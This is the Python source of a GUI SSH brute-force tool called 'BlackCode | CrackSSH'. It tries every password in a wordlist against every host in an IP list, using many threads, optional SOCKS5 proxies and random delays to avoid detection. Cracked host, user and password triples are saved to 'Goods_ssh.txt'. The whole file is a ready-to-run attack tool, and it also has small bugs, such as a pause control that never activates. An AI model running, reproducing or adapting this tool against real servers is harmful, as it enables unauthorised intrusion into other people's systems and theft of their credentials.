import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import time
import paramiko
import logging
import random
import json
import csv
import os
import io
import contextlib
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from threading import Lock
try:
    from plyer import notification
    HAVE_NOTIFY = True
except:
    HAVE_NOTIFY = False
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")
logging.getLogger("paramiko").setLevel(logging.CRITICAL + 100)
class ModernSSHBruteForce(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("BlackCode | CrackSSH")
        self.geometry("1050x800")
        self.resizable(True, True)
        self.ips = []
        self.passwords = []
        self.username = ctk.StringVar()
        self.timeout = ctk.StringVar(value="15")
        self.threads = ctk.StringVar(value="50")
        self.delay_min = ctk.StringVar(value="0.0")
        self.delay_max = ctk.StringVar(value="0.2")
        self.proxy_file = ctk.StringVar()
        self.max_per_ip = ctk.StringVar(value="10")
        self.running = False
        self.paused = False
        self.stop_flag = False
        self.successful = 0
        self.failed = 0
        self.output_file = "Goods_ssh.txt"
        self.config_file = "config.json"
        self.file_lock = Lock()
        self.start_time = None
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.proxies = []
        self.ip_attempts = {}
        self.ip_lock = Lock()
        self.success_var = ctk.StringVar(value="0")
        self.fail_var = ctk.StringVar(value="0")
        self.total_var = ctk.StringVar(value="0")
        self.rate_var = ctk.StringVar(value="0.00%")
        self.time_var = ctk.StringVar(value="00:00:00")
        self.progress_var = ctk.DoubleVar(value=0.0)
        self.status_var = ctk.StringVar(value="Ready")
        self.load_config()
        self.create_widgets()
        self.protocol("WM_DELETE_WINDOW", self.on_close)
    def create_widgets(self):
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        main_frame = ctk.CTkFrame(self, corner_radius=15)
        main_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
        main_frame.grid_columnconfigure(0, weight=1)
        main_frame.grid_rowconfigure(7, weight=1)
        title_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        title_frame.grid(row=0, column=0, pady=(10,15), sticky="ew")
        ctk.CTkLabel(title_frame, text="BlackCrackSSH",
                     font=ctk.CTkFont(size=26, weight="bold")).pack(side=ctk.LEFT)
        self.theme_btn = ctk.CTkButton(title_frame, text="Dark", width=80,
                                       command=self.toggle_theme)
        self.theme_btn.pack(side=ctk.RIGHT)
        file_frame = ctk.CTkFrame(main_frame, corner_radius=10)
        file_frame.grid(row=1, column=0, padx=10, pady=5, sticky="ew")
        file_frame.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(file_frame, text="IP list:").grid(row=0, column=0, padx=5, pady=3, sticky="w")
        self.ip_entry = ctk.CTkEntry(file_frame, placeholder_text="Select IP file...")
        self.ip_entry.grid(row=0, column=1, padx=5, pady=3, sticky="ew")
        ctk.CTkButton(file_frame, text="Browse", width=70, command=lambda: self.browse_file("ip")).grid(row=0, column=2, padx=5)
        ctk.CTkLabel(file_frame, text="Password list:").grid(row=1, column=0, padx=5, pady=3, sticky="w")
        self.pw_entry = ctk.CTkEntry(file_frame, placeholder_text="Select password file...")
        self.pw_entry.grid(row=1, column=1, padx=5, pady=3, sticky="ew")
        ctk.CTkButton(file_frame, text="Browse", width=70, command=lambda: self.browse_file("pw")).grid(row=1, column=2, padx=5)
        param_frame = ctk.CTkFrame(main_frame, corner_radius=10)
        param_frame.grid(row=2, column=0, padx=10, pady=5, sticky="ew")
        param_frame.grid_columnconfigure(1, weight=1)
        param_frame.grid_columnconfigure(3, weight=1)
        row = 0
        ctk.CTkLabel(param_frame, text="Username:").grid(row=row, column=0, padx=5, pady=3, sticky="w")
        ctk.CTkEntry(param_frame, textvariable=self.username, width=180).grid(row=row, column=1, padx=5, pady=3, sticky="w")
        ctk.CTkLabel(param_frame, text="Timeout (s):").grid(row=row, column=2, padx=5, pady=3, sticky="w")
        ctk.CTkEntry(param_frame, textvariable=self.timeout, width=80).grid(row=row, column=3, padx=5, pady=3, sticky="w")
        row = 1
        ctk.CTkLabel(param_frame, text="Threads:").grid(row=row, column=0, padx=5, pady=3, sticky="w")
        ctk.CTkEntry(param_frame, textvariable=self.threads, width=80).grid(row=row, column=1, padx=5, pady=3, sticky="w")
        ctk.CTkLabel(param_frame, text="Max attempts per IP:").grid(row=row, column=2, padx=5, pady=3, sticky="w")
        ctk.CTkEntry(param_frame, textvariable=self.max_per_ip, width=80).grid(row=row, column=3, padx=5, pady=3, sticky="w")
        row = 2
        ctk.CTkLabel(param_frame, text="Random delay (min‑max s):").grid(row=row, column=0, padx=5, pady=3, sticky="w")
        delay_frame = ctk.CTkFrame(param_frame, fg_color="transparent")
        delay_frame.grid(row=row, column=1, padx=5, pady=3, sticky="w")
        ctk.CTkEntry(delay_frame, textvariable=self.delay_min, width=60).pack(side=ctk.LEFT, padx=2)
        ctk.CTkLabel(delay_frame, text="—").pack(side=ctk.LEFT, padx=2)
        ctk.CTkEntry(delay_frame, textvariable=self.delay_max, width=60).pack(side=ctk.LEFT, padx=2)
        ctk.CTkLabel(param_frame, text="Proxy list:").grid(row=row, column=2, padx=5, pady=3, sticky="w")
        self.proxy_entry = ctk.CTkEntry(param_frame, placeholder_text="Optional proxy file")
        self.proxy_entry.grid(row=row, column=3, padx=5, pady=3, sticky="ew")
        ctk.CTkButton(param_frame, text="Browse", width=60, command=self.browse_proxy).grid(row=row, column=4, padx=2)
        self.progress = ctk.CTkProgressBar(main_frame, variable=self.progress_var,
                                           height=20, corner_radius=10)
        self.progress.grid(row=3, column=0, padx=10, pady=10, sticky="ew")
        self.progress.set(0)
        stats_frame = ctk.CTkFrame(main_frame, corner_radius=10)
        stats_frame.grid(row=4, column=0, padx=10, pady=5, sticky="ew")
        stats_frame.grid_columnconfigure((0,1,2,3,4,5), weight=1)
        ctk.CTkLabel(stats_frame, text="Successful:").grid(row=0, column=0)
        ctk.CTkLabel(stats_frame, textvariable=self.success_var, text_color="#2ecc71",
                    font=ctk.CTkFont(weight="bold")).grid(row=0, column=1)
        ctk.CTkLabel(stats_frame, text="Failed:").grid(row=0, column=2)
        ctk.CTkLabel(stats_frame, textvariable=self.fail_var, text_color="#e74c3c",
                    font=ctk.CTkFont(weight="bold")).grid(row=0, column=3)
        ctk.CTkLabel(stats_frame, text="Total:").grid(row=0, column=4)
        ctk.CTkLabel(stats_frame, textvariable=self.total_var, font=ctk.CTkFont(weight="bold")).grid(row=0, column=5)
        ctk.CTkLabel(stats_frame, text="Success Rate:").grid(row=1, column=0)
        ctk.CTkLabel(stats_frame, textvariable=self.rate_var, text_color="#3498db",
                    font=ctk.CTkFont(weight="bold")).grid(row=1, column=1)
        ctk.CTkLabel(stats_frame, text="Elapsed:").grid(row=1, column=2)
        ctk.CTkLabel(stats_frame, textvariable=self.time_var, font=ctk.CTkFont(weight="bold")).grid(row=1, column=3)
        btn_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        btn_frame.grid(row=5, column=0, padx=10, pady=10)
        self.start_btn = ctk.CTkButton(btn_frame, text="▶ Start", command=self.start_crack,
                                       width=110, height=40, fg_color="#2ecc71", hover_color="#27ae60",
                                       font=ctk.CTkFont(weight="bold"))
        self.start_btn.pack(side=ctk.LEFT, padx=5)
        self.pause_btn = ctk.CTkButton(btn_frame, text="Pause", command=self.toggle_pause,
                                       width=110, height=40, fg_color="#f39c12", hover_color="#e67e22",
                                       state=ctk.DISABLED, font=ctk.CTkFont(weight="bold"))
        self.pause_btn.pack(side=ctk.LEFT, padx=5)
        self.stop_btn = ctk.CTkButton(btn_frame, text="Stop", command=self.stop_crack,
                                       width=110, height=40, fg_color="#e74c3c", hover_color="#c0392b",
                                       state=ctk.DISABLED, font=ctk.CTkFont(weight="bold"))
        self.stop_btn.pack(side=ctk.LEFT, padx=5)
        ctk.CTkButton(btn_frame, text="Clear Log", command=self.clear_log,
                     width=90, height=40, fg_color="#95a5a6", hover_color="#7f8c8d").pack(side=ctk.LEFT, padx=5)
        ctk.CTkButton(btn_frame, text="Export HTML", command=self.export_html,
                     width=110, height=40, fg_color="#9b59b6", hover_color="#8e44ad").pack(side=ctk.LEFT, padx=5)
        log_frame = ctk.CTkFrame(main_frame, corner_radius=10)
        log_frame.grid(row=7, column=0, padx=10, pady=5, sticky="nsew")
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)
        self.log_text = ctk.CTkTextbox(log_frame, wrap="word", state="disabled",
                                       font=ctk.CTkFont(size=11))
        self.log_text.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")
        status_bar = ctk.CTkLabel(self, textvariable=self.status_var, anchor="w",
                                  fg_color="#2c3e50", corner_radius=5, padx=10)
        status_bar.grid(row=1, column=0, padx=20, pady=(0,10), sticky="ew")
    def browse_file(self, kind):
        path = filedialog.askopenfilename()
        if path:
            if kind == "ip":
                self.ip_entry.delete(0, ctk.END); self.ip_entry.insert(0, path)
            else:
                self.pw_entry.delete(0, ctk.END); self.pw_entry.insert(0, path)
    def browse_proxy(self):
        path = filedialog.askopenfilename()
        if path:
            self.proxy_entry.delete(0, ctk.END); self.proxy_entry.insert(0, path)
    def toggle_theme(self):
        current = ctk.get_appearance_mode()
        if current == "Dark":
            ctk.set_appearance_mode("Light")
            self.theme_btn.configure(text="Light")
        else:
            ctk.set_appearance_mode("Dark")
            self.theme_btn.configure(text="Dark")
    def clear_log(self):
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", ctk.END)
        self.log_text.configure(state="disabled")
    def log(self, msg):
        self.after(0, lambda: self._append_log(msg))
    def _append_log(self, msg):
        self.log_text.configure(state="normal")
        self.log_text.insert(ctk.END, msg + "")
        self.log_text.see(ctk.END)
        self.log_text.configure(state="disabled")
    def update_stats(self):
        self.success_var.set(str(self.successful))
        self.fail_var.set(str(self.failed))
        total = self.successful + self.failed
        self.total_var.set(str(total))
        if total > 0:
            rate = (self.successful / total) * 100
            self.rate_var.set(f"{rate:.2f}%")
        if self.start_time:
            elapsed = time.time() - self.start_time
            self.time_var.set(time.strftime("%H:%M:%S", time.gmtime(elapsed)))
        self.update_idletasks()
    def update_progress(self, cur, total):
        if total > 0:
            self.progress_var.set(cur / total)
        self.update_stats()
    def set_controls(self, running):
        state = ctk.NORMAL if running else ctk.DISABLED
        self.start_btn.configure(state=ctk.DISABLED if running else ctk.NORMAL)
        self.pause_btn.configure(state=state, text="Pause")
        self.stop_btn.configure(state=state)
        if not running:
            self.paused = False
            self.pause_event.set()
        self.update_idletasks()
    def start_crack(self):
        ip_file = self.ip_entry.get().strip()
        pw_file = self.pw_entry.get().strip()
        if not ip_file or not pw_file:
            messagebox.showerror("Error", "Select both files")
            return
        if not self.username.get().strip():
            messagebox.showerror("Error", "Username required")
            return
        try:
            with open(ip_file) as f:
                self.ips = [l.strip() for l in f if l.strip()]
            with open(pw_file) as f:
                self.passwords = [l.strip() for l in f if l.strip()]
        except Exception as e:
            messagebox.showerror("Error", f"Read error: {e}")
            return
        if not self.ips or not self.passwords:
            messagebox.showerror("Error", "Empty file")
            return

        # load proxies
        self.proxies = []
        if self.proxy_entry.get().strip():
            try:
                with open(self.proxy_entry.get().strip()) as f:
                    self.proxies = [l.strip() for l in f if l.strip()]
            except:
                self.log("⚠ Proxy file ignored (read error)")

        # reset
        self.successful = 0
        self.failed = 0
        self.stop_flag = False
        self.paused = False
        self.pause_event.set()
        self.start_time = time.time()
        self.progress_var.set(0)
        self.ip_attempts.clear()
        self.clear_log()

        with open(self.output_file, "w") as f:
            f.write(f"# SSH Brute Force Pro Results\n" + "-"*50+"")

        self.set_controls(True)
        self.status_var.set("Running…")
        threading.Thread(target=self.crack_loop, daemon=True).start()

    def stop_crack(self):
        self.stop_flag = True
        self.pause_event.set()
        self.status_var.set("Stopping…")

    def toggle_pause(self):
        if not self.running:
            return
        if self.paused:
            self.paused = False
            self.pause_event.set()
            self.pause_btn.configure(text="Pause", fg_color="#f39c12")
            self.status_var.set("Running…")
        else:
            self.paused = True
            self.pause_event.clear()
            self.pause_btn.configure(text="Resume", fg_color="#2ecc71")
            self.status_var.set("Paused")

    def crack_loop(self):
        timeout = int(self.timeout.get())
        username = self.username.get().strip()
        max_workers = int(self.threads.get())
        max_per_ip = int(self.max_per_ip.get())
        delay_min = float(self.delay_min.get())
        delay_max = float(self.delay_max.get())
        total_combos = len(self.ips) * len(self.passwords)

        self.log(f"Targets: {len(self.ips)} IPs × {len(self.passwords)} passwords = {total_combos}\n")
        self.log(f"Threads: {max_workers} | Timeout: {timeout}s | Max/IP: {max_per_ip}\n")
        if self.proxies:
            self.log(f"Using {len(self.proxies)} proxies\n")
        self.log("---------------------------------------------\n")

        def attempt_via_proxy(ip, pwd):
            # random delay
            if delay_max > 0:
                time.sleep(random.uniform(delay_min, delay_max))

            # per‑IP limit check
            with self.ip_lock:
                cnt = self.ip_attempts.get(ip, 0)
                if cnt >= max_per_ip:
                    return False
                self.ip_attempts[ip] = cnt + 1

            proxy = random.choice(self.proxies) if self.proxies else None

            # build connect parameters
            kwargs = dict(
                hostname=ip,
                username=username,
                password=pwd,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False,
                compress=True,
            )
            if proxy and ":" in proxy:
                host, port = proxy.split(":")
                kwargs["sock"] = self._socks_proxy(host, int(port))

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                with contextlib.redirect_stderr(io.StringIO()):
                    client.connect(**kwargs)
                client.close()
                self.successful += 1
                self.log(f"[+] {ip} | {pwd}")
                with self.file_lock:
                    with open(self.output_file, "a") as f:
                        f.write(f"IP: {ip} | User: {username} | Pass: {pwd} Time: {time.ctime()}\n")
                        f.write(f"{'-' * 50 } \n")
                if HAVE_NOTIFY:
                    notification.notify("SSH Crack", f"Found {ip} : {pwd}", timeout=5)
                return True
            except paramiko.AuthenticationException:
                self.failed += 1
            except Exception:
                self.failed += 1
            return False

        def combo_gen():
            for ip in self.ips:
                for pwd in self.passwords:
                    yield ip, pwd

        gen = combo_gen()
        pending = set()
        max_pending = max_workers * 2

        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            # initial fill
            for _ in range(max_pending):
                try:
                    ip, pwd = next(gen)
                    pending.add(ex.submit(attempt_via_proxy, ip, pwd))
                except StopIteration:
                    break

            while pending and not self.stop_flag:
                done, pending = wait(pending, return_when=FIRST_COMPLETED)
                for f in done:
                    f.result()
                # refill
                while len(pending) < max_pending:
                    try:
                        ip, pwd = next(gen)
                        pending.add(ex.submit(attempt_via_proxy, ip, pwd))
                    except StopIteration:
                        break
                # update GUI
                total_so = self.successful + self.failed
                self.after(0, lambda: self.update_progress(total_so, total_combos))
                self.status_var.set(f"Progress: {total_so}/{total_combos}")

            if not self.stop_flag:
                for f in pending:
                    f.result()

        self.running = False
        self.after(0, self.finish_crack)

    def _socks_proxy(self, host, port):
        import socks
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, host, port)
        s.settimeout(10)
        return s
    def finish_crack(self):
        t = self.successful + self.failed
        if t:
            r = (self.successful / t) * 100
            self.log(f"{'='*50} \n")
            self.log(f"Finished: {time.ctime()}\n")
            self.log(f"Success: {self.successful} / Fail: {self.failed} / Total: {t} ({r:.2f}%)\n")
            self.log(f"Saved to: {self.output_file}\n")
        self.set_controls(False)
        self.status_var.set("Done ✓")
        self.save_config()
    def export_html(self):
        if not os.path.exists(self.output_file):
            messagebox.showerror("Error", "No result file")
            return
        save = filedialog.asksaveasfilename(defaultextension=".html",
                                            filetypes=[("HTML file", "*.html")])
        if not save:
            return
        try:
            with open(self.output_file) as f:
                lines = f.read()
            html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>BlackCode | Cracker SSH</title>
<style>
body {{ font-family: monospace; background: #1e1e1e; color: #ccc; padding: 20px; }}
h1 {{ color: #2ecc71; }}
.success {{ color: #2ecc71; }}
.fail {{ color: #e74c3c; }}
pre {{ background: #252526; padding: 10px; border-radius: 8px; }}
</style></head><body>
<h1>🔓 Cracker SSH | BlackCode</h1>
<p>Generated: {time.ctime()}</p>
<pre>{lines}</pre>
</body></html>"""
            with open(save, "w") as f:
                f.write(html)
            messagebox.showinfo("Exported", f"Saved to {save}\n")
            os.system(f"xdg-open '{save}'")
        except Exception as e:
            messagebox.showerror("Error", str(e))
    def save_config(self):
        cfg = {k: getattr(self, k).get() if hasattr(getattr(self, k), 'get') else getattr(self, k)
               for k in ['username', 'timeout', 'threads', 'delay_min', 'delay_max', 'max_per_ip']}
        cfg.update({'ip_file': self.ip_entry.get(), 'pw_file': self.pw_entry.get(),
                    'proxy_file': self.proxy_entry.get()})
        try:
            with open(self.config_file, "w") as f:
                json.dump(cfg, f, indent=4)
        except:
            pass

    def load_config(self):
        try:
            with open(self.config_file) as f:
                cfg = json.load(f)
            self.username.set(cfg.get('username', ''))
            self.timeout.set(str(cfg.get('timeout', '15')))
            self.threads.set(str(cfg.get('threads', '50')))
            self.delay_min.set(str(cfg.get('delay_min', '0.0')))
            self.delay_max.set(str(cfg.get('delay_max', '0.2')))
            self.max_per_ip.set(str(cfg.get('max_per_ip', '10')))
            self.ip_entry.insert(0, cfg.get('ip_file', ''))
            self.pw_entry.insert(0, cfg.get('pw_file', ''))
            self.proxy_entry.insert(0, cfg.get('proxy_file', ''))
        except:
            pass

    def on_close(self):
        if self.running:
            if not messagebox.askyesno("Quit", "Stop attack and exit?"):
                return
            self.stop_flag = True
            self.pause_event.set()
        self.save_config()
        self.destroy()

if __name__ == "__main__":
    app = ModernSSHBruteForce()
    app.mainloop()
